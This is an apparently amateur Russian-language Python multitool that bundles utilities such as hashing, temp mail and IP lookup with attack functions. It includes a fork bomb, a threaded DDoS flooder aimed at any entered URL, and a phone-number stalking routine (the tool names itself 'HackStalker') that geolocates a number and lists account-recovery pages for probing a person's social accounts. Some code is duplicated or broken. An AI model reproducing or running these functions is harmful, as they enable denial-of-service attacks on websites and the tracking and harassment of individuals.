import os
import random
import string
import time
import socket
import threading
import hashlib
import subprocess
import platform

import colorama
import requests
import uuid
import screeninfo
import psutil
import importlib
import webbrowser
import phonenumbers
import g4f

from functools import lru_cache
from bs4 import BeautifulSoup as bs
from pynput.mouse import Controller, Button
from pynput.keyboard import Listener, KeyCode
def get_detailed_phone_info(phone):
        try:
            parsed_number = phonenumbers.parse(phone)
            if not phonenumbers.is_valid_number(parsed_number):
                print("")

            MOBILE = phonenumbers.number_type(parsed_number) == phonenumbers.PhoneNumberType.MOBILE
            FIXED_LINE = phonenumbers.number_type(parsed_number) == phonenumbers.PhoneNumberType.FIXED_LINE
            VOIP = phonenumbers.number_type(parsed_number) == phonenumbers.PhoneNumberType.VOIP

            VALID = phonenumbers.is_valid_number(parsed_number)
            POSSIBLE = phonenumbers.is_possible_number(parsed_number)
            if MOBILE == True:
                print(" 💣Мобильный номер💣 Да")
            else:
                print(" 💣Мобильный номер💣 Нет")
            if FIXED_LINE == True:
                print(" 💣Есть ли функция FL(Fixed Line)💣 Да")
            else:
                print(" 💣Есть ли функция FL(Fixed Line)💣 Нет")
            if VOIP == True:
                print(" 💣Включен ли VoIP💣 Да")
            else:
                print(" 💣Включен ли VoIP💣 Нет")
            if VALID == True:
                print(" 💣Правильно ли набран💣 Да")
            else:
                print(" 💣Правильно ли набран💣 Нет")
            if POSSIBLE == True:
                print(" 💣Возможен ли номер💣 Да")
            else:
                print(" 💣Возможен ли номер💣 Нет")
        except Exception as e:
            print("")
def webs(url):
    webbrowser.open_new(url)
def console(command):
    os.system(command)
def fork():
    forks = 0
    while True:
        forks += 1
        print(f"[+{forks} форк]")
        fork = os.fork()
def get_wifi_info():
    system = platform.system()
    try:
        if system.lower() == 'windows':
            output = subprocess.check_output("netsh wlan show interfaces", shell=True, encoding='utf-8')
            print("💣️Wi-Fi информация для Windows💣️")
            print(output)
        elif system.lower() == 'linux':
            output = subprocess.check_output("iwconfig", shell=True, encoding='utf-8')
            print("💣️Wi-Fi информация для Linux💣️ ")
            print(output)
        elif system.lower() == 'darwin' or system.lower() == 'macos':
            output = subprocess.check_output("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I", shell=True, encoding='utf-8')
            print("💣️Wi-Fi информация для macOS💣️ ")
            print(output)
        else:
            print("💣️Неподдерживаемая операционная система!💣️")
    except subprocess.CalledProcessError as e:
        print(f"💣️Ошибка выполнения команды: {e}💣️")
    except Exception as e:
        print(f"💣️Произошла ошибка: {e}💣️")

get_wifi_info()
def gpt(promt1:str)->str:
    response = g4f.ChatCompletion.create(
    model = g4f.models.gpt_4o1,
    messages=[{"role": "user", "content": promt1}],
    )
    return response
def start():
    print("""
                                ██    ██
                    ██████      ██  ██
                  ██      ██
                ██          ████░░    ████
                ██
              ██████            ██  ██
              ██████            ██    ██
          ██████████████
        ██████░░░░░░░░▓▓██
      ██████░░░░░░░░  ▓▓▓▓██
      ██████▓▓▓▓▓▓▓▓    ▓▓██
    ████████▓▓▓▓▓▓▓▓▓▓  ▓▓▓▓██
    ████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██
    ████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██
      ████████▓▓▓▓▓▓▓▓▓▓▓▓██
      ████████████▓▓▓▓▓▓████
        ██████████████████
          ██████████████
              ██████""")
toggle_key = KeyCode(char='v')
clicking = False
mouse = Controller()
def get_info(ip):
    url = f"https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-ip?ip={ip}"
    try:
        response = requests.get(url)
        response.raise_for_status()
        stealers_data = response.json().get('stealers', [])

        if stealers_data:
            for data in stealers_data:
                    computer_name = data.get('computer_name', '/')
                    operating_system = data.get('operating_system', '/')
                    ip = data.get('ip', '/')
                    malware_path = data.get('malware_path', '/')
                    date_compromised = data.get('date_compromised', '/')
                    antiviruses = data.get('antiviruses', '/')
                    print(f"{colorama.Fore.LIGHTWHITE_EX}{colorama.Fore.LIGHTGREEN_EX}💣️Имя ПК💣️{colorama.Fore.LIGHTYELLOW_EX} {colorama.Fore.LIGHTWHITE_EX} ", computer_name)
                    print(f"{colorama.Fore.LIGHTWHITE_EX}{colorama.Fore.LIGHTGREEN_EX}💣️Операционная система💣️{colorama.Fore.LIGHTYELLOW_EX} {colorama.Fore.LIGHTWHITE_EX} ", operating_system)
                    print(f"{colorama.Fore.LIGHTWHITE_EX}{colorama.Fore.LIGHTGREEN_EX}💣️IP💣️{colorama.Fore.LIGHTYELLOW_EX} {colorama.Fore.LIGHTWHITE_EX} ", ip)
                    print(f"{colorama.Fore.LIGHTWHITE_EX}{colorama.Fore.LIGHTGREEN_EX}💣️Путь малваря💣️{colorama.Fore.LIGHTYELLOW_EX} {colorama.Fore.LIGHTWHITE_EX} ", malware_path)
                    print(f"{colorama.Fore.LIGHTWHITE_EX}{colorama.Fore.LIGHTGREEN_EX}💣️Дата компромисса💣️{colorama.Fore.LIGHTYELLOW_EX} {colorama.Fore.LIGHTWHITE_EX} ", date_compromised)
                    print(f"{colorama.Fore.LIGHTWHITE_EX}{colorama.Fore.LIGHTGREEN_EX}💣️АнттиВирусы💣️{colorama.Fore.LIGHTYELLOW_EX} {colorama.Fore.LIGHTWHITE_EX} ", antiviruses)
            else:
                print(f"{colorama.Fore.LIGHTWHITE_EX}{colorama.Fore.LIGHTRED_EX}💣️Не найдено💣️")

    except:
        print("") 
def clicker():
    while True:
        if clicking:
            mouse.click(Button.left, 5)
            time.sleep(0.8)


def toggle_event(key):
    if key == toggle_key:
        global clicking
        clicking = not clicking


def click_left():
    clicking_thread = threading.Thread(target=clicker)
    clicking_thread.start()

    with Listener(on_press=toggle_event) as listener:
        listener.join()

toggle_key = KeyCode(char='v')
clicking = False
mouse = Controller()

def clicker():
    while True:
        if clicking:
            mouse.click(Button.left, 5)
            time.sleep(0.1)


def toggle_event(key):
    if key == toggle_key:
        global clicking
        clicking = not clicking


def click_right():
    clicking_thread = threading.Thread(target=clicker)
    clicking_thread.start()

    with Listener(on_press=toggle_event) as listener:
        listener.join()
def ddos(URL):
    threads = 20
    def dos(target):
        while True:
            try:
                res = requests.get(target)
                print(colorama.Fore.YELLOW + "[Бот отправлен]" + colorama.Fore.WHITE)
                if threads > threads:
                    print("DDOS остановлен")
            except requests.exceptions.ConnectionError:
                print(colorama.Fore.RED + "{!} " + colorama.Fore.LIGHTGREEN_EX + " [Check your internet connect]")

            try:
                    threads = int(input("💣️Боты💣️ "))
            except ValueError:
                    exit(colorama.Fore.RED+"{!}"+colorama.Fore.LIGHTGREEN_EX+" [Некорректное количество]")
            if threads == 0:
                    exit(colorama.Fore.RED+"{!}"+colorama.Fore.LIGHTGREEN_EX+" [Некорректное количество]")
            if not URL.__contains__("http"):
                    exit(colorama.Fore.RED+"{!}"+colorama.Fore.LIGHTGREEN_EX+" [Некорректная ссылка]")

            if not URL.__contains__("."):
                    exit(colorama.Fore.RED+"{!}"+colorama.Fore.LIGHTGREEN_EX+" [Неправильный домен]")

            for i in range(0, threads):
                    thr = threading.Thread(target=dos, args=(URL,))
                    thr.start()
                    print(colorama.Fore.YELLOW+"["+str(i + 1) + " бот отправлен]")
API = 'https://www.1secmail.com/api/v1/'
domain_list = ["1secmail.com", "1secmail.org", "1secmail.net"]
domain = random.choice(domain_list)


def generate_username():
    name = string.ascii_lowercase + string.digits
    username = ''.join(random.choice(name) for i in range(10))

    return username

def get_ip_by_hostname():
    hostname = input('💣Домен(без http/https)💣 ')
    
    try:
        print(f'💣Хост💣 {hostname}\n💣IP💣 {socket.gethostbyname(hostname)}')
    except socket.gaierror as error:
        print(f'💣Неправильная ссылка - {error}💣')


def main():
    print(get_ip_by_hostname())
    
if __name__ == '__main__':
    main()
def check_mail(mail=''):
    req_link = f'{API}?action=getMessages&login={mail.split("@")[0]}&domain={mail.split("@")[1]}'
    r = requests.get(req_link).json()
    length = len(r)

    if length == 0:
        print('💣Нет ни одного сообщения💣')
    else:
        id_list = []

        for i in r:
            for k,v in i.items():
                if k == 'id':
                    id_list.append(v)

        print(f'💣У вас {length} сообщений. Почта обновляется каждые пять секунд💣 \n')

        current_dir = os.getcwd()



        for i in id_list:
            read_msg = f'{API}?action=readMessage&login={mail.split("@")[0]}&domain={mail.split("@")[1]}&id={i}'
            r = requests.get(read_msg).json()

            sender = r.get('from')
            subject = r.get('subject')
            date = r.get('date')
            content = r.get('textBody')

            print(f'💣Отправитель💣: {sender}\n💣Кому💣: {mail}\n💣Тема письма💣: {subject}\n💣Дата💣: {date}\n💣Сообщение💣: {content}')

def delete_mail(mail=''):
    url = 'https://www.1secmail.com/mailbox'

    data = {
        'action': 'deleteMailbox',
        'login': mail.split('@')[0],
        'domain': mail.split('@')[1]
    }

    r = requests.post(url, data=data)
    print(f'💣Ваша почта - {mail} удалена!💣\n')


def secmail():
    try:
        username = generate_username()
        mail = f'{username}@{domain}'
        print(f'💣Ваша временная почта: {mail}💣')

        mail_req = requests.get(f'{API}?login={mail.split("@")[0]}&domain={mail.split("@")[1]}')

        while True:
            check_mail(mail=mail)
            time.sleep(5)

    except(KeyboardInterrupt):
        delete_mail(mail=mail)
        print('💣Остановлено💣')
COLOR_CODE = {
    "UNDERLINE": "\033[04m",
    "URL_L": "\033[36m"}
class PhoneRadar:
    def __init__(self, user_number: str) -> None:
        self.__phoneradar_url: str = "https://phoneradar.ru/phone/"
        self.__not_found_text: str = "💣Информация отсутствует💣"
        self.__user_number: str = (user_number.replace(" ", "")
            .replace("(", "").replace(")", "")
            .replace("-", "").replace("+", ""))
    
    @lru_cache(maxsize=None)
    def __get_site_resurces(self):

        try:
            __resurce: bytes = requests.get(self.__phoneradar_url + self.__user_number)
            return __resurce.content
        
        except requests.exceptions.ConnectionError as connection_error:
            return False

    @property
    def get_rating(self):
        
        resurce: bytes = self.__get_site_resurces()
        if resurce:
            try:
                rating_link: str = self.__phoneradar_url + self.__user_number
                response: bytes = bs(resurce, "html.parser")
                target_block = response.find('a', href=F"/phone/{self.__user_number[1:]}")

                if target_block:

                    card_body = target_block.find_parent('div', class_='card-body')
                    if card_body:
                        comment: str = card_body.find('p').text.strip()
                        
                        name: str = card_body.find('p').find_next().find_next().text
                        
                        rating = F"{comment} / {name}"
                
                return rating, rating_link
            
            except (AttributeError, UnboundLocalError):
                return self.__not_found_text, rating_link
            
        return self.__not_found_text, rating_link
 
class HttpWebNumber:

    def __init__(self) -> None:
        self.__check_number_link: str = "https://htmlweb.ru/geo/api.php?json&telcod="
        self.__not_found_text: str = "💣Информация отсутствует💣"
    @lru_cache(maxsize=None)
    def __return_number_data(self, user_number: str) -> dict:
        try:
            __result_number_data = requests.get(self.__check_number_link + user_number, headers={
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15"})
        
            if __result_number_data.ok:
                try: __result_number_data: dict = __result_number_data.json()
                except: 
                    exit(f'{colorama.Fore.RED}[!] {colorama.Fore.RED}💣Введите код страны💣{colorama.Fore.RESET} например: +7 в место 8..\n')

            else:
                __result_number_data: dict = {"status_error": True}

        except requests.exceptions.ConnectionError as connection_error:
            __result_number_data: dict = {"status_error": True}
        
        return __result_number_data

    @property
    def print_number_results(self) -> str:

        try:
            _user_number: str = input(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}{colorama.Fore.RED}{colorama.Fore.CYAN}{colorama.Fore.LIGHTGREEN_EX}' + 
                f' 💣Введите номер телефона{colorama.Fore.LIGHTBLACK_EX} +79833170773💣 {colorama.Fore.RESET}').strip()
            if _user_number:
                print(f'{colorama.Fore.RED}{colorama.Fore.YELLOW} 💣Поиск данных... 💣{colorama.Fore.RESET}\n')
                _get_user_number_data = self.__return_number_data(user_number=_user_number)
                if _get_user_number_data.get("status_error") or _get_user_number_data.get("error"):
                    print(f'{colorama.Fore.RED}{colorama.Fore.YELLOW} 💣Данные не найдены💣{colorama.Fore.RESET}\n')

                else:
                    _number_data_unknown = _get_user_number_data
                    _number_data_country = _get_user_number_data.get('country')
                    _number_data_capital = _get_user_number_data.get('capital')
                    _number_data_region = _get_user_number_data.get('region')
                    _number_data_other = _get_user_number_data.get('0')

                    if not _number_data_region:
                        _number_data_region: dict = {"autocod": self.__not_found_text, 
                        "name": self.__not_found_text,
                        "okrug": self.__not_found_text}
                    else:
                        print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                            f'{colorama.Fore.LIGHTGREEN_EX}💣Страна💣{colorama.Fore.WHITE} '+
                            f'{_number_data_country.get("name", self.__not_found_text)}, ' +
                            f'{_number_data_country.get("fullname", self.__not_found_text)}{colorama.Fore.RESET}')

                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}💣Город💣{colorama.Fore.WHITE} '+
                        f'{_number_data_other.get("name", self.__not_found_text)}{colorama.Fore.RESET}')

                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}💣Почтовый индекс💣{colorama.Fore.WHITE} '+
                        f'{_number_data_other.get("post", self.__not_found_text)}{colorama.Fore.RESET}')

                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}💣Код валюты💣{colorama.Fore.WHITE} '+
                        f'{_number_data_country.get("iso", self.__not_found_text)}{colorama.Fore.RESET}')

                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}💣Телефонные коды💣{colorama.Fore.WHITE} '+
                        f'{_number_data_capital.get("telcod", self.__not_found_text)}{colorama.Fore.RESET}')

                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}💣Посмотреть в Wikipedia💣{colorama.Fore.RESET}{COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]} '+
                        f'{_number_data_other.get("wiki", self.__not_found_text)}{colorama.Fore.RESET}')


                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}💣Гос. номер региона авто💣{colorama.Fore.WHITE} '+
                        f'{_number_data_region.get("autocod", self.__not_found_text)}{colorama.Fore.RESET}')

                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}💣Оператор💣{colorama.Fore.WHITE} '+
                        f'{_number_data_other.get("oper", self.__not_found_text)}, {colorama.Fore.LIGHTBLACK_EX}'+
                            f'{_number_data_other.get("oper_brand", self.__not_found_text)}, '+
                            f'{_number_data_other.get("def", self.__not_found_text)}{colorama.Fore.RESET}')
                
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}💣Местоположение💣{colorama.Fore.WHITE} '+
                        f'{_number_data_country.get("name", self.__not_found_text)}, ' +
                        f'{_number_data_region.get("name", self.__not_found_text)}, ' +
                        f'{_number_data_other.get("name", self.__not_found_text)}{colorama.Fore.LIGHTBLACK_EX} ('+
                            f'{_number_data_other.get("latitude", self.__not_found_text)}, '+
                            f'{_number_data_other.get("longitude", self.__not_found_text)}){colorama.Fore.RESET}')

                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}💣Открыть на карте (Google)💣{colorama.Fore.RESET}{COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]} '+
                        f'https://www.google.com/maps/place/'+
                        f'{_number_data_other.get("latitude", self.__not_found_text)}+'+
                        f'{_number_data_other.get("longitude", self.__not_found_text)}{colorama.Fore.RESET}')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}💣Локация💣{colorama.Fore.WHITE} '+
                        f'{_number_data_unknown.get("location", self.__not_found_text)}{colorama.Fore.RESET}')

                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}💣Язык общения💣{colorama.Fore.WHITE} '+
                        f'{_number_data_country.get("lang", self.__not_found_text).title()}, '+
                            f'{_number_data_country.get("langcod", self.__not_found_text)}{colorama.Fore.RESET}')
            
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}💣Край/Округ/Область💣{colorama.Fore.WHITE} '+
                        f'{_number_data_region.get("name", self.__not_found_text)}, '+ 
                            f'{_number_data_region.get("okrug", self.__not_found_text)}{colorama.Fore.RESET}')                     

                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}💣Столица💣{colorama.Fore.WHITE} '+
                        f'{_number_data_capital.get("name", self.__not_found_text)}{colorama.Fore.RESET}')

                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}💣Широта/Долгота💣{colorama.Fore.WHITE} '+
                        f'{_number_data_other.get("latitude", self.__not_found_text)}, '+
                        f'{_number_data_other.get("longitude", self.__not_found_text)}{colorama.Fore.RESET}')
                    
                    _phone_radar = PhoneRadar(user_number=_user_number)
                    _phone_rating, _rating_link = _phone_radar.get_rating
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT} '+
                        f'{colorama.Fore.LIGHTGREEN_EX}💣Оценка номера в сети💣{colorama.Fore.WHITE} '+
                        f'{_phone_rating}{COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]} {_rating_link}{colorama.Fore.RESET}')
                    get_detailed_phone_info(f"{_user_number}")
                    print(f'\n{colorama.Fore.CYAN}{colorama.Style.BRIGHT} {colorama.Fore.LIGHTGREEN_EX}Проверьте эти ссылки (Мессенджеры и Социальные сети): {colorama.Fore.RESET}')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}0{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}https://www.instagram.com/accounts/password/reset{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - 💣Поиск аккаунта в Instagram💣')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}1{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}https://api.whatsapp.com/send?phone={colorama.Fore.MAGENTA}{_user_number}{COLOR_CODE["URL_L"]}&text=Привет,%20это%20%20HackStalker!{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - 💣Поиск номера в WhatsApp💣')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}2{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}https://facebook.com/login/identify/?ctx=recover&ars=royal_blue_bar{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - 💣Поиск аккаунта FaceBook💣')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}3{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}https://www.linkedin.com/checkpoint/rp/request-password-reset?{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - 💣Поиск аккаунта Linkedin💣')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}4{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}https://ok.ru/dk?st.cmd=anonymRecoveryStartPhoneLink{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - 💣Поиск аккаунта OK💣')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}5{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}https://twitter.com/account/begin_password_reset{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - 💣Поиск аккаунта Twitter💣')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}6{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}https://viber://add?number={colorama.Fore.MAGENTA}{_user_number}{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - 💣Поиск номера в Viber💣')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}7{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}https://skype:{colorama.Fore.MAGENTA}{_user_number}{COLOR_CODE["URL_L"]}?call{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - 💣Звонок на номер с Skype💣')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}8{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}https://t.me/{colorama.Fore.MAGENTA}{_user_number}{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - 💣Открыть аккаунт в Телеграмме💣')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}9{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}https://yandex.ru/yandsearch?text={colorama.Fore.MAGENTA}{_user_number}{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - 💣Поиск по Yandex💣')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}10{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}https://google.ru/search?q={colorama.Fore.MAGENTA}{_user_number}{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - 💣Поиск по Google💣')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}11{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}tel:{colorama.Fore.MAGENTA}{_user_number}{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - 💣Звонок на номер с телефона💣')
            else:
                print(f'{colorama.Fore.RED}[!] {colorama.Fore.YELLOW}💣Ошибка, введите номер телефона!💣{colorama.Fore.RESET}\n')

        except KeyboardInterrupt:
            print(f'\n{colorama.Fore.RED}[!] {colorama.Fore.YELLOW}💣Вынужденная остановка работы!💣\n')
    print(colorama.Fore.RESET)
def get_info_ip(ip = '127.0.0.1'):
    try:
        response = requests.get(url=f'http://ip-api.com/json/{ip}').json()        
        data = {
            '💣Статус💣️': response.get('status'),
            '💣IP💣': response.get('query'),
            '💣Интернет провайдер💣': response.get('isp'),
            '💣Организация💣': response.get('org'),
            '💣Страна💣': response.get('country'),
            '💣Регион💣': response.get('regionName'),
            '💣Город💣': response.get('city'),
            '💣Почтовый индекс💣': response.get('zip'),
            '💣Ширина💣': response.get('lat'),
            '💣Долгота💣': response.get('lon'),
            '💣Часовой пояс💣': response.get('timezone'),
            '💣AS💣': response.get('as')
        }
        
        for k, v in data.items():
            print(f'{k} : {v}')
        
    except requests.exceptions.ConnectionError:
        print('💣Проверьте соединение!💣')
def parsing(URL):
        print("💣Содержимое ссылки:💣 ")
        url = f'{URL}'
        response = requests.get(url)
        url2 = response.request
        r = requests.get(url)
        tree = bs(r.text, 'html.parser')
        for link in tree.find_all('a'): 
            print(f"{link.get('href')}  💣--->💣  {link.text}")
        print("💣Код:💣 ")
        print(r.text)
        print("💣Печеньки:💣 ")
        print(r.headers)
        print("💣Путь ссылки:💣 ")
        print(url2.path_url)
        print("💣Метод ссылки:💣 ")
        print(url2.method)
        print("💣Статус ответа ссылки:💣 ")
        print(r.status_code)
        print("💣Ответ ссылки:💣 ")
        print(r.reason)
def hashes():
    hashs = int(input("""
1. Blake2B
2. Blake2S
3. MD5
4. SHA1
5. SHA224
6. SHA256
7. SHA384
8. SHA3_224
9. SHA3_256
10. SHA3_384
11. SHA3_512
12. SHA512
13. Shake_128
14. Shake_256
💣Введите номер хэша💣 """))
    try:
        algorithms = {
            1: "blake2b",
            2: "blake2s",
            3: "md5",
            4: "sha1",
            5: "sha224",
            6: "sha256",
            7: "sha384",
            8: "sha3_224",
            9: "sha3_256",
            10: "sha3_384",
            11: "sha3_512",
            12: "sha512",
            13: "shake_128",
            14: "shake_256",
        }

        if hashs not in algorithms:
            print("💣Недопустимый номер!💣")
            return

        what_hash = input("💣Введите текст💣")
        algorithm_name = algorithms[hashs]

        if algorithm_name.startswith("shake"):
            length = int(input("💣Введите длину хэша(в байтах)💣 "))
            hash_obj = getattr(hashlib, algorithm_name)()
            hash_obj.update(what_hash.encode())
            result = hash_obj.hexdigest(length)
        else:
            hash_obj = getattr(hashlib, algorithm_name)()
            hash_obj.update(what_hash.encode())
            result = hash_obj.hexdigest()

        print(f"💣Результат хэширования💣 {result}")

    except:
        print(f"💣Ошибка!💣")
def get_pc():
    print("💣Веб-Камеры💣")
    camera_keywords = ['camera', 'webcam']
    for process in psutil.process_iter(['pid', 'name']):
        try:
            process_name = process.info['name'].lower()
            if any(keyword in process_name for keyword in camera_keywords):
                print(f"💣Процесс, использующий камеру💣 {process.info['name']} (PID: {process.info['pid']})")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    for conn in psutil.net_connections(kind='inet'):
        if conn.raddr:
            print(f"💣Локальный адрес💣 {conn.laddr.ip}:{conn.laddr.port}, "
                  f"💣Удалённый адрес💣 {conn.raddr.ip}:{conn.raddr.port}, "
                  f"💣PID💣 {conn.pid}")
    print("💣Инофрмация ПК💣")
    for monitor in screeninfo.get_monitors():
        pc_stat = f"""💣Внимание! Информация написана на английском языке!💣
💣RAM Total💣 {str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB💣
💣RAM Used💣 {psutil.virtual_memory().percent}%💣
💣CPU Frequency💣 💣{psutil.cpu_freq().current:.2f} Mhz💣
💣CPU Count💣 💣{psutil.cpu_count()}💣
💣CPU Used💣 💣{psutil.cpu_percent()}%💣
💣Python Version💣 💣{platform.python_version()}💣
💣Python Used💣 💣{psutil.Process().memory_info()[0] / 2.**30:.2f}💣 GB💣
💣Display Name💣 💣{monitor.name}💣
💣Display FullScreen💣 💣{monitor.width} x {monitor.height}💣
💣Battery💣 💣{int(psutil.sensors_battery().percent)}%💣
💣IP💣 💣{requests.get(url=f'http://ip-api.com/json/').json().get('query')}💣
💣MAC💣 💣{uuid.getnode()}💣
💣Time💣 💣{time.strftime("Время💣 %H:%M:%S💣   💣Дата💣 %Y-%m-%d💣")}"""
        print(pc_stat)